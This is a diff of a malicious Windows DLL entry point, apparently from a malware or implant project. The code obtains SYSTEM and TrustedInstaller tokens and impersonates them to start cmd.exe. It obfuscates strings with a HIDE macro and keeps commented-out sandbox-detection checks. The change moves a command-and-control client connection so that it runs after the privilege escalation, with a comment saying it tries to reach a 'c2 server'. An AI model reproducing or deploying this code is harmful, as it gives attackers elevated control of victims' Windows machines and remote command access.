@@ -42,10 +42,6 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		//if ( SandboxCompromise::SuspicousProcRunning() )
 		//	ProcessUtilities::HaltProcessExecution();
 
-
-		Client me;
-		me.Connect();
-
 		HANDLE escalatedPriv = ProcessUtilities::GetSystemToken();
 		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
 		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
@@ -53,11 +49,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		std::vector<wchar_t> cmd(wstrCmd.begin(), wstrCmd.end());
 		cmd.push_back(L'\0');
 		 
-		STARTUPINFO si = { 0 };																																			
+		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi;
 
-		DWORD  pid2  = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));
-		HANDLE token = ProcessUtilities::CreateProcessAccessToken(pid2);
+		HANDLE token = ProcessUtilities::GetTrustedInstallerToken();
 
 		ProcessUtilities::OpenProcessAsImposter(
 			token,
@@ -71,6 +66,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 			&pi
 		);
 
+		// try to connect to c2 server
+		Client me;
+		if ( !me.Connect() )
+			me.~Client();
 
 		ProcessUtilities::Clean();
 
